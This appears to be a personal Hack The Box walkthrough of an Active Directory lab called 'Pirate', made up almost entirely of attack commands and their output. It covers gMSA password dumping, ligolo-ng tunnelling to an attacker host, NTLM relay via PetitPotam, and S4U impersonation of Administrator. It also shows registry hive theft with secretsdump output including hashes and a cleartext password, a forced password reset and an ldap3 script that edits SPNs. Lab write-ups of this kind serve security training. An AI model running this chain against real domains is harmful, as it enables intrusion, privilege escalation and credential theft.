## NMAP SCAN
```
nmap -sSCV -p- 10.129.244.95
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-19 02:37 -0400
Nmap scan report for 10.129.244.95
Host is up (0.094s latency).
Not shown: 65511 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-19 13:45:33Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: pirate.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-04-19T13:47:13+00:00; +6h59m57s from scanner time.
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
| Not valid before: 2025-06-09T14:05:15
|_Not valid after:  2026-06-09T14:05:15
443/tcp   open  https?
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: pirate.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-04-19T13:47:13+00:00; +6h59m57s from scanner time.
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
| Not valid before: 2025-06-09T14:05:15
|_Not valid after:  2026-06-09T14:05:15
2179/tcp  open  vmrdp?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: pirate.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-04-19T13:47:13+00:00; +6h59m57s from scanner time.
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
| Not valid before: 2025-06-09T14:05:15
|_Not valid after:  2026-06-09T14:05:15
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: pirate.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
| Not valid before: 2025-06-09T14:05:15
|_Not valid after:  2026-06-09T14:05:15
|_ssl-date: 2026-04-19T13:47:13+00:00; +6h59m57s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49694/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49921/tcp open  msrpc         Microsoft Windows RPC
49948/tcp open  msrpc         Microsoft Windows RPC
49971/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-04-19T13:46:32
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m57s, deviation: 1s, median: 6h59m56s

``` 
so using bloodhound got to know that i can get TGT of  some machines as they are pre2k machines which basically has their own name as password .... 
![[Pasted image 20260501145222.png]]

and ADFS_PROD and ADCS_PROD are member of MS01 so lets get  TGT of MS01 ...
```
impacket-getTGT "pirate.htb/MS01:ms01" -dc-ip 10.129.244.95 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in MS01.ccache

```

now we have TGT so we can read password of gmsa of both the machines.... 
![[Pasted image 20260501145633.png]]

edit the krb5.conf file to pirate realm and get the passwords/hash
```
[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = PIRATE.HTB

[realms]
    PIRATE.HTB = {
        kdc = dc01.pirate.htb
        admin_server = dc01.pirate.htb
        default_domain = pirate.htb
    }

[domain_realm]
    .pirate.htb = PIRATE.HTB
    pirate.htb = PIRATE.HTB

```

```
python3 gMSADumper.py -k -d pirate.htb -l dc01.pirate.htb  
Users or groups who can read password for gMSA_ADCS_prod$:
 > Domain Secure Servers
gMSA_ADCS_prod$:::89fb53c2bc3eadb4142b4158cfdb2997
gMSA_ADCS_prod$:aes256-cts-hmac-sha1-96:be42f681a905710e3384f80fd41c89fc5cf90ce02231146044b5ff7ab3860a41
gMSA_ADCS_prod$:aes128-cts-hmac-sha1-96:637f787f4823e3db89e8751e32e89a55
Users or groups who can read password for gMSA_ADFS_prod$:
 > Domain Secure Servers
gMSA_ADFS_prod$:::accd0fdfe82ff8c84cd710244c7302e8
gMSA_ADFS_prod$:aes256-cts-hmac-sha1-96:528fc97bf06eab5b5a6068ed201d14eb90efa606dedee12d7f8fc79afc08616a
gMSA_ADFS_prod$:aes128-cts-hmac-sha1-96:5c0c4ae1b21c6235c17eaa88013b69ef
```
so both the members are remote management users.... lets try to winrm 

connected and found a new ip 
```
*Evil-WinRM* PS C:\> ipconfig

Windows IP Configuration


Ethernet adapter vEthernet (Switch01):

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::d976:c606:587e:f1e1%8
   IPv4 Address. . . . . . . . . . . : 192.168.100.1
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . :

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : .htb
   IPv4 Address. . . . . . . . . . . : 10.129.244.95
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.129.0.1

```

used lingolo ng and got the tunneling 
```
*Evil-WinRM* PS C:\users\gmsa_adcs_prod$\Downloads> .\ligolo-ng_agent_0.8.3_windows_amd64.exe -connect 10.10.14.53:11601 -ignore-cert
ligolo-ng_agent_0.8.3_windows_amd64.exe : time="2026-05-01T10:50:42-07:00" level=warning msg="warning, certificate validation disabled"
    + CategoryInfo          : NotSpecified: (time="2026-05-0...ation disabled":String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
time="2026-05-01T10:50:42-07:00" level=info msg="Connection established" addr="10.10.14.53:11601"
```

```
sudo ip tuntap add user $(whoami) mode tun ligolo
[sudo] password for kali: 
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
	└─$ sudo ip link set ligolo up
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ ligolo-proxy -selfcert

INFO[0000] Loading configuration file ligolo-ng.yaml    
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
INFO[0000] Listening on 0.0.0.0:11601                   
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!
  Version: dev

ligolo-ng » INFO[0120] Agent joined.                                 id=00155d0bd000 name="PIRATE\\gMSA_ADCS_prod$@DC01" remote="10.129.244.95:50763"
ligolo-ng » 
ligolo-ng » session
? Specify a session : 1 - PIRATE\gMSA_ADCS_prod$@DC01 - 10.129.244.95:50763 - 00155d0bd000
[Agent : PIRATE\gMSA_ADCS_prod$@DC01] » start
```

lets add the ip for tunnel route... 
```
sudo ip route add 192.168.100.0/24 dev ligolo
```
## NMAP 192.168.100.1  
```
nmap -sSCV -p- 192.168.100.1                                    
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-02 00:55 +0700
Stats: 0:00:20 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 7.63% done; ETC: 01:00 (0:04:02 remaining)
Nmap scan report for 192.168.100.1
Host is up (0.00033s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-01 18:00:36Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-05-01T18:01:28
|_  start_date: N/A
|_clock-skew: -1s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
```

```
nxc smb 192.168.100.1 -u '' -p '' --shares
SMB         192.168.100.1   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.100.1   445    DC01             [+] pirate.htb\: 
SMB         192.168.100.1   445    DC01             [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

interesting...

so this ip for DC01....
```
fping -a -g 192.168.100.0/24
192.168.100.2
192.168.100.1
```
found new ip and i am able to ping it... 
lets do nmap scan 

## NMAP SCAN 192.168.100.2
```
nmap -sSCV -p- 192.168.100.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-02 01:25 +0700
Nmap scan report for 192.168.100.2
Host is up (0.00028s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  https?
445/tcp   open  microsoft-ds?
808/tcp   open  mc-nmf        .NET Message Framing
1500/tcp  open  mc-nmf        .NET Message Framing
1501/tcp  open  mc-nmf        .NET Message Framing
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49443/tcp open  unknown
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49681/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49707/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-05-01T18:54:59
|_  start_date: N/A
|_clock-skew: -1s
```

so it is WEB01

```
nmap --script=smb2-security-mode -p445 192.168.100.2 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-02 02:45 +0700
Nmap scan report for 192.168.100.2
Host is up (0.011s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
```

we can try ntlmrelay.... 
```
impacket-addcomputer pirate.htb/pentest:'p3nt3st2025!&' -computer-name 'FAKEMACHINE$' -computer-pass 'Password123!' -dc-ip 10.129.244.95
```
we will add our user as a computer first 
```
python3 dnstool.py -u 'pirate.htb\pentest' -p 'p3nt3st2025!&' -d pirate.htb -a add -r 'ATTACKER' -d 10.10.14.53 10.129.244.95

```
and add a dns to our machine... 
lets start ntlmrelay server
```
impacket-ntlmrelayx -smb2support -t ldap://10.129.244.95 --remove-mic --delegate-access --escalate-user 'FAKEMACHINE$' 
Impacket v0.13.0.dev0+20250919.210843.8426ec99 - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client RPC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client WINRMS loaded..
[*] Protocol Client SMB loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Setting up WinRM (HTTP) Server on port 5985
[*] Setting up WinRMS (HTTPS) Server on port 5986
[*] Setting up RPC Server on port 135
[*] Multirelay disabled

[*] Servers started, waiting for connections

```

The `--remove-mic` flag is required because WEB01's NTLM authentication requests signing. Without MIC stripping, the relay fails with an authentication error at the LDAPS target.

```
python3 PetitPotam.py -u 'pentest' --password 'p3nt3st2025!&' --domain pirate.htb ATTACKER.pirate.htb 192.168.100.2
/home/kali/exploits/PetitPotam.py:23: SyntaxWarning: invalid escape sequence '\ '
  | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __

                                                                                               
              ___            _        _      _        ___            _                     
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
                                         
              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)
      
                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN



Trying pipe lsarpc
[-] Connecting to ncacn_np:192.168.100.2[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!

```

ok so attack worked...
```
[*] Servers started, waiting for connections
[*] (SMB): Received connection from 10.129.244.95, attacking target ldap://10.129.244.95
[*] (SMB): Authenticating connection from PIRATE/WEB01$@10.129.244.95 against ldap://10.129.244.95 SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] All targets processed!
[*] (SMB): Connection from 10.129.244.95 controlled, but there are no more targets left!
[*] Delegation rights modified succesfully!
[*] FAKEMACHINE$ can now impersonate users on WEB01$ via S4U2Proxy
```
so now we can move forward... 
```
impacket-getST -spn cifs/WEB01.pirate.htb -impersonate Administrator -dc-ip 10.129.244.95 pirate.htb/FAKEMACHINE$:'Password123!' 
Impacket v0.13.0.dev0+20250919.210843.8426ec99 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache

```

ok we got tgt for admin on web01 great !
lets connect using winrm and get LSA dump 
```
evil-winrm -i 192.168.100.2 -r PIRATE.HTB -k Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache --spn cifs
                                        
Evil-WinRM shell v3.9

                                        
Warning: IP address detected (192.168.100.2). Kerberos requires FQDN. Do you want to attempt reverse DNS lookup?
                                        
Warning: Press "y" to attempt DNS resolution, press any other key to cancel

                                        
Info: Attempting reverse DNS lookup to get FQDN for Kerberos...
                                        
Info: Found FQDN(s) in /etc/hosts: WEB01.pirate.htb
                                        
[+] Resolved IP 192.168.100.2 to FQDN: WEB01.pirate.htb
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: Useless cert/s provided, SSL is not enabled
                                        
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator.PIRATE\Documents> 
*Evil-WinRM* PS C:\Users\Administrator.PIRATE\Documents> reg save hklm\sam sam.bak
The operation completed successfully.

*Evil-WinRM* PS C:\Users\Administrator.PIRATE\Documents> reg save hklm\system system.bak
The operation completed successfully.

*Evil-WinRM* PS C:\Users\Administrator.PIRATE\Documents> download sam.bak
                                        
Info: Downloading C:\Users\Administrator.PIRATE\Documents\sam.bak to sam.bak
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Users\Administrator.PIRATE\Documents> download system.bak
                                        
Info: Downloading C:\Users\Administrator.PIRATE\Documents\system.bak to system.bak
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Users\Administrator.PIRATE\Documents> reg save hklm\security security.bak
The operation completed successfully.

*Evil-WinRM* PS C:\Users\Administrator.PIRATE\Documents> download security.bak
                                        
Info: Downloading C:\Users\Administrator.PIRATE\Documents\security.bak to security.bak
                                        
Info: Download successful!

```

lets get the user flag ... 
we used --spn cifs becaue of it matches the ticket

```*Evil-WinRM* PS C:\Users\Administrator.PIRATE\Desktop> cd ..
*Evil-WinRM* PS C:\Users\Administrator.PIRATE> cd ..
*Evil-WinRM* PS C:\Users> ls


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        1/15/2026   7:37 PM                a.white
d-----         6/9/2025  10:11 AM                Administrator
d-----         6/9/2025   6:55 AM                Administrator.PIRATE
d-----         6/9/2025   7:31 AM                gMSA_ADFS_prod$
d-----        1/15/2026   6:40 PM                gMSA_ADFS_prod$.PIRATE
d-r---         6/8/2025   1:29 PM                Public


*Evil-WinRM* PS C:\Users> cd a.white
*Evil-WinRM* PS C:\Users\a.white> cd Desktop
*Evil-WinRM* PS C:\Users\a.white\Desktop> ls


    Directory: C:\Users\a.white\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         5/2/2026   7:55 AM             34 user.txt


*Evil-WinRM* PS C:\Users\a.white\Desktop> type user.txt
4e731abde974bef28e72ccca55e0de3d

```

now lets get the pass 
```
impacket-secretsdump -sam sam.bak -system system.bak -security security.bak LOCAL 
Impacket v0.13.0.dev0+20250919.210843.8426ec99 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x342dfe90cc4061078b79f011cd08f931
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:b1aac1584c2ea8ed0a9429684e4fc3e5:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:60da2d3ba00d6b5932e4c87dce6fa6b4:::
[*] Dumping cached domain logon information (domain/username:hash)
PIRATE.HTB/Administrator:$DCC2$10240#Administrator#8baf09ddc5830ac4456ee8639dd89644: (2026-02-25 02:41:09+00:00)
PIRATE.HTB/gMSA_ADFS_prod$:$DCC2$10240#gMSA_ADFS_prod$#66812dfee46ff41c9c8245a2819c3183: (2026-05-02 14:57:02+00:00)
PIRATE.HTB/a.white:$DCC2$10240#a.white#366c8924be3ea6d1d12825569a4bcc39: (2026-05-02 14:54:59+00:00)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:29f1505d87014b01b4317fed1d52ddbee2792a698e7e1de1bcdf29ab5d4b8e54828ce470d23491ba84e82d786622a821a14c730cf8610a32db1951b7619ee08c3bcacbab53aac8e052bd64e638c6bbd9529daacf04f86cfb9034808c4378d2c328c8c6afe7655f4a099dc41caeb6279c53313edcbd58db3e14490b7543ba3250ac200ec9834992b61b3f4319162645b50f402de4db0843fc43db7d54e04828abf86e490959bc88670e50f0b50373a3745f70039f8fd032435c4a725526957c7ae0dbaa81273b3aa28c0b029fea90c271b6601ef3ba7a05a13ec8c8ffd9999dd10eee87b4b9eb08a8a4af90710056f558
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:feba09cf0013fbf5834f50def734bca9
[*] DefaultPassword 
(Unknown User):E2nvAOKSz5Xz2MJu
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x01cffc2ef9a91d20107371f9a4a4112c892ed989
dpapi_userkey:0xa4fddb1b2df2db7cc3d044dc1b559bc1b45a1de9
[*] NL$KM 
 0000   A5 24 39 57 3F 8F 30 DC  61 F1 56 B7 B5 5C 0F 7C   .$9W?.0.a.V..\.|
 0010   6B 0A FF DF B0 A2 99 C3  68 A9 FE 15 E2 48 33 A9   k.......h....H3.
 0020   E9 8C 27 F8 8B 7C 05 55  4D FE 3C 5D 09 EA 9C 49   ..'..|.UM.<]...I
 0030   95 EB 7A 09 5B 48 7A 14  DC 74 E9 CB 7C 1A E0 8A   ..z.[Hz..t..|...
NL$KM:a52439573f8f30dc61f156b7b55c0f7c6b0affdfb0a299c368a9fe15e24833a9e98c27f88b7c05554dfe3c5d09ea9c4995eb7a095b487a14dc74e9cb7c1ae08a
[*] _SC_GMSA_DPAPI_{C6810348-4834-4a1e-817D-5838604E6004}_a09ca32bc7cd2ce752ae0143bd203f0551564c04dd2846c4ed3e4e5a61cc9f11 
 0000   E3 EF 47 4B 98 13 8D D4  46 9F 6D C1 76 F8 79 BA   ..GK....F.m.v.y.
 0010   1E 08 17 BA 44 50 21 87  B9 08 0B 9F 33 34 C9 1B   ....DP!.....34..
 0020   9B 1A F1 CE 4E 91 FB 56  2C 8D 88 24 41 2C 70 0E   ....N..V,..$A,p.
 0030   00 D1 05 BC 67 4D 8E 26  A5 94 E3 DA 41 73 F2 C8   ....gM.&....As..
 0040   73 13 D6 34 B3 9C 34 12  D4 BF B6 84 92 47 68 6D   s..4..4......Ghm
 0050   F6 06 5B 53 65 66 80 7E  0A CE 92 F9 4E A3 16 6B   ..[Sef.~....N..k
 0060   B9 75 2D 12 D3 52 C8 9B  9F DA FA 7D 31 71 E4 DD   .u-..R.....}1q..
 0070   55 BE 9D 58 55 04 F8 C6  28 A0 FF 4C 67 0D 75 95   U..XU...(..Lg.u.
 0080   A9 09 A3 C9 A7 EC 2D FF  98 4E 5D DF 77 04 9A 91   ......-..N].w...
 0090   A5 59 7F 0A 39 C5 49 94  55 67 59 01 CC E4 1A DE   .Y..9.I.UgY.....
 00a0   D9 8D 80 A1 B5 F7 F8 2C  C2 20 B5 90 DF 4B FC 0B   .......,. ...K..
 00b0   FC 5F 0F EB 66 E7 3A 56  F1 AB 7F E9 14 C6 D7 CD   ._..f.:V........
 00c0   2B 83 E0 B9 06 5B 76 E0  2B C3 30 F7 69 44 16 F3   +....[v.+.0.iD..
 00d0   AC D6 C4 63 DF 84 92 35  00 B6 4A 10 14 E7 44 13   ...c...5..J...D.
 00e0   80 9A 7A 06 AF 57 7C E7  68 5B FD 2A B5 6A 20 67   ..z..W|.h[.*.j g
_SC_GMSA_DPAPI_{C6810348-4834-4a1e-817D-5838604E6004}_a09ca32bc7cd2ce752ae0143bd203f0551564c04dd2846c4ed3e4e5a61cc9f11:e3ef474b98138dd4469f6dc176f879ba1e0817ba44502187b9080b9f3334c91b9b1af1ce4e91fb562c8d8824412c700e00d105bc674d8e26a594e3da4173f2c87313d634b39c3412d4bfb6849247686df6065b536566807e0ace92f94ea3166bb9752d12d352c89b9fdafa7d3171e4dd55be9d585504f8c628a0ff4c670d7595a909a3c9a7ec2dff984e5ddf77049a91a5597f0a39c5499455675901cce41aded98d80a1b5f7f82cc220b590df4bfc0bfc5f0feb66e73a56f1ab7fe914c6d7cd2b83e0b9065b76e02bc330f7694416f3acd6c463df84923500b64a1014e74413809a7a06af577ce7685bfd2ab56a2067
[*] _SC_GMSA_{84A78B8C-56EE-465b-8496-FFB35A1B52A7}_a09ca32bc7cd2ce752ae0143bd203f0551564c04dd2846c4ed3e4e5a61cc9f11 
 0000   01 00 00 00 22 01 00 00  10 00 00 00 12 01 1A 01   ...."...........
 0010   B6 C4 08 39 11 A2 83 50  B1 FD 69 48 80 36 50 E1   ...9...P..iH.6P.
 0020   B1 C5 74 1F 77 19 B1 F4  FF 92 62 03 DC DF 4E C9   ..t.w.....b...N.
 0030   C0 36 9B 7B 92 FE 10 A2  D7 FF 95 3B FA 40 6A 3B   .6.{.......;.@j;
 0040   67 86 52 3E D8 27 67 CC  8F E2 73 4A F8 92 E9 8E   g.R>.'g...sJ....
 0050   FB EF 2B 34 76 75 90 32  B4 EC DE F3 42 76 C3 63   ..+4vu.2....Bv.c
 0060   B8 A9 41 0B 63 D8 09 EA  6E F1 67 F5 B5 41 D7 3C   ..A.c...n.g..A.<
 0070   3A C4 21 4D A2 2A 14 D9  79 82 C9 28 D9 1B B9 71   :.!M.*..y..(...q
 0080   FE 99 D4 80 9C 1E BD EA  E8 E7 69 C6 B3 37 7E E1   ..........i..7~.
 0090   A4 78 DF FB B2 DD C1 33  18 BE 13 11 67 D1 A4 A0   .x.....3....g...
 00a0   18 33 A4 C2 7E 05 12 69  0D 73 DE 1E 59 A0 17 61   .3..~..i.s..Y..a
 00b0   EC 7D 40 FC 18 82 05 0C  BF 43 9D 9C BB 28 1A 06   .}@......C...(..
 00c0   D4 BF 8D 85 D1 FE B2 74  0E C3 99 EC A0 E4 6E 36   .......t......n6
 00d0   99 0B 72 B2 C4 A6 4A E0  09 BA FB 3D FD 26 4F F7   ..r...J....=.&O.
 00e0   34 B6 3F B9 22 60 9E 8C  30 58 83 A7 5D 9A EF 75   4.?."`..0X..]..u
 00f0   CE 37 BC A0 91 04 36 59  0D 93 12 FC A4 6A D8 9A   .7....6Y.....j..
 0100   61 A8 9B DD C8 73 19 7D  E4 8E AB 3D 69 B9 E4 98   a....s.}...=i...
 0110   00 00 19 41 B0 1B 73 17  00 00 19 E3 DF 68 72 17   ...A..s......hr.
 0120   00 00                                              ..
_SC_GMSA_{84A78B8C-56EE-465b-8496-FFB35A1B52A7}_a09ca32bc7cd2ce752ae0143bd203f0551564c04dd2846c4ed3e4e5a61cc9f11:01000000220100001000000012011a01b6c4083911a28350b1fd6948803650e1b1c5741f7719b1f4ff926203dcdf4ec9c0369b7b92fe10a2d7ff953bfa406a3b6786523ed82767cc8fe2734af892e98efbef2b3476759032b4ecdef34276c363b8a9410b63d809ea6ef167f5b541d73c3ac4214da22a14d97982c928d91bb971fe99d4809c1ebdeae8e769c6b3377ee1a478dffbb2ddc13318be131167d1a4a01833a4c27e0512690d73de1e59a01761ec7d40fc1882050cbf439d9cbb281a06d4bf8d85d1feb2740ec399eca0e46e36990b72b2c4a64ae009bafb3dfd264ff734b63fb922609e8c305883a75d9aef75ce37bca0910436590d9312fca46ad89a61a89bddc873197de48eab3d69b9e49800001941b01b7317000019e3df6872170000
[-] NTDSHashes.__init__() got an unexpected keyword argument 'remoteSSMethodWMINTDS'
[*] Cleaning up...
```

we got E2nvAOKSz5Xz2MJu a clear text password lets use nxc and see whose is it 
```
nxc smb 10.129.244.95 -u /home/kali/HTB\ BOXES/Pirate\ /user.txt -p E2nvAOKSz5Xz2MJu 
SMB         10.129.244.95   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.244.95   445    DC01             [-] pirate.htb\pentest:E2nvAOKSz5Xz2MJu STATUS_LOGON_FAILURE 
SMB         10.129.244.95   445    DC01             [-] pirate.htb\a.white_adm:E2nvAOKSz5Xz2MJu STATUS_LOGON_FAILURE 
SMB         10.129.244.95   445    DC01             [+] pirate.htb\a.white:E2nvAOKSz5Xz2MJu 
```

so it is a.white's pass
lets have a look at bloodhound and escalate from there 

## ATTACK PATH 
1. a.white has forcechangepass of a.white_adm 
2. a.white_adm is a member of IT group which has WriteSPN on DC01
3. then we can CoerceToTGT on pirate.htb which has Admin

```
impacket-changepasswd pirate.htb/a.white_adm@10.129.244.95 -newpass 'P@ssw0rd123!' -reset -dc-ip 10.129.244.95 -altuser a.white -altpass E2nvAOKSz5Xz2MJu 

Impacket v0.13.0.dev0+20250919.210843.8426ec99 - Copyright Fortra, LLC and its affiliated companies 

[*] Setting the password of pirate.htb\a.white_adm as pirate.htb\a.white
[*] Connecting to DCE/RPC as pirate.htb\a.white
[*] Password was changed successfully.
[!] User no longer has valid AES keys for Kerberos, until they change their password again.

```

this exploit will get admin ticket on DC01, we remove the HTTP part from WEB01 and put it on DC01 and get the DC01 ticket as a.white_adm has contrain delegation priv on it

```


import ldap3

server = ldap3.Server('10.129.244.95', get_info=ldap3.ALL)
conn = ldap3.Connection(server, user='pirate.htb\\a.white_adm',
                        password='P@ssw0rd123!', authentication=ldap3.NTLM,
                        auto_bind=True)

# Step 1: Remove HTTP SPNs from WEB01$
conn.modify('CN=WEB01,CN=Computers,DC=pirate,DC=htb', {
    'servicePrincipalName': [(ldap3.MODIFY_DELETE,
        ['HTTP/WEB01', 'HTTP/WEB01.pirate.htb'])]
})
